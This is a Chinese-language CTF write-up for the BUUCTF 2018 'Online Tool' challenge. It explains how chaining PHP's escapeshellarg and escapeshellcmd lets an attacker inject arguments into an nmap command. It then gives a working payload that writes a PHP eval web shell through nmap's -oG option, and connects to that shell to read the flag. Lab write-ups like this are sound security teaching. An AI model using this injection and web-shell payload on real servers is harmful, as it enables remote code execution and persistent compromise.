# 原创
：  [BUUCTF 2018]Online Tool

# [BUUCTF 2018]Online Tool

#### [BUUCTF 2018]Online Tool

## 考点

> 
escapeshellarg和escapeshellcmd使用不当造成RCE


## 思路

> 
如果应用使用escapeshellarg -&gt; escapeshellcmd这样的流程来处理输入，<br/> 两个函数配合使用就会导致多个参数的注入


```
详细分析一下：

传入的参数是：172.17.0.2' -v -d a=1
经过escapeshellarg处理后变成了'172.17.0.2'\'' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
经过escapeshellcmd处理后变成'172.17.0.2'\\'' -v -d a=1\'，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php
最后执行的命令是curl '172.17.0.2'\\'' -v -d a=1\'，由于中间的\\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'
回到mail中，我们的 payload 最终在执行时变成了'-fa'\\''\( -OQueueDirectory=/tmp -X/var/www/html/test.php \)@a.com\'，分割后就是-fa\(、-OQueueDirectory=/tmp、-X/var/www/html/test.php、)@a.com'，最终的参数就是这样被注入的

```

> 
1、我们看下题目给的源码<br/> 2、简单的来说就是两次转译后出现了问题，没有考虑到单引号的问题<br/> 3、然后往下看，看到echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);<br/> 4、这有个system来执行命令，而且有传参，肯定是利用这里了<br/> 5、这里代码的本意是希望我们输入ip这样的参数做一个扫描，通过上面的两个函数来进行规则过滤转译，我们的输入会被单引号引起来，但是因为我们看到了上面的漏洞所以我们可以逃脱这个引号的束缚<br/> 6、这里常见的命令后注入操作如 | &amp; &amp;&amp;都不行，虽然我们通过上面的操作逃过了单引号，但escapeshellcmd会对这些特殊符号前面加上\来转移…<br/> 7、这时候就只有想想能不能利用nmap来做些什么了<br/> 8、这时候搜索可以发现在nmap命令中 有一个参数-oG可以实现将命令和结果写到文件<br/> 9、这个命令就是我们的输入可控！然后写入到文件！OK很自然的想到了上传一个一句话木马了…


## Payload

```
?host=' &lt;?php @eval($_POST["cmd"]);?&gt; -oG shell.php '

执行后会返回文件夹名

you are in sandbox 6febfd099df5962193786bbd79ffc413Starting Nmap 7.70 ( https://nmap.org ) at 2021-05-16 14:16 UTC Nmap done: 0 IP addresses (0 hosts up) scanned in 0.08 seconds Nmap done: 0 IP addresses (0 hosts up) scanned in 0.08 seconds

使用蚁剑连接
http://22f35451-214a-43ff-8486-39d9e4188b33.node3.buuoj.cn/6febfd099df5962193786bbd79ffc413/shell.php

找到根目录下的flag

```
